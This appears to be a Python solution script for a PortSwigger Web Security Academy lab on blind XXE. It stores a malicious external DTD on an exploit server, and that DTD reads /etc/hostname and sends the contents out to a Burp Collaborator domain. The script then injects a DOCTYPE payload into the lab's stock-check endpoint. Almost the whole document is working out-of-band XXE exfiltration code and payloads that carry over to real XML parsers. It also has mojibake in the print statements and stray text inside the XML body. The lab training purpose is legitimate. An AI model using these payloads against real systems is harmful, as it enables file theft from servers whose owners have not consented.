#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 15/10/2023
#
# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
#
# Steps: 1. Store the malicious DTD file in your exploit server
#        2. Inject payload into the XML-based check stock request to exfiltrate
#           the hostname using an external DTD
#        3. Check your burp collaborator for the hostname in the HTTP request
#           query parameter
#        4. Submit the solution
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0aec004e041147ee801277f1000300af.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a2a0071041c474080e8761201700098.exploit-server.net"

# change this to your collaborator domain
collaborator = "f7n5ghp7jgr3cl0vz4h3g6f7qywpko8d.oastify.com"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8"

# the name of the your malicious file
# you can change this to what you want
malicious_file_name = "exploit.dtd"

# the content of the malicious DTD file
malicious_file = f"""<!ENTITY % file SYSTEM "file:///etc/hostname">
                        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://{collaborator}/?hostname=%file;'>">
                        %eval;
                        %exfiltrate;"""
    

# data to send via POST
data = {
    "formAction": "STORE",
    "urlIsHttps": "on",
    "responseFile": f"/{malicious_file_name}",
    "responseHead": exploit_server_head,
    "responseBody": malicious_file,
}

print(Fore.BLUE + "âŸª#âŸ« Injection point: " + Fore.YELLOW + "XML-based check stock request")

try:
    # store your malicious DTD file on your exploit server
    injection = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to store your malicious DTD file on your exploit server through exception")
    exit(1)

print(Fore.WHITE + "â¦—1â¦˜ Storing the malicious DTD file on your exploit server.. " + Fore.GREEN + "OK")


# payload to exfiltrate the hostname using an external DTD
payload = f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{exploit_server_url}/{malicious_file_name}"> %xxe; ]>
            <stockCheck>
                <productId>
                    2
                </productId>
                <storeId>
                    1
                </storeId>external entities
                external entities
            </stockCheck>"""

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{lab_url}/product/stock", data=payload, headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "â¦—2â¦˜ Injecting payload to exfiltrate the hostname using an external DTD.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "ðŸ—¹ Check your burp collaborator for the hostname in the HTTP request query parameter then sumbit the solution")



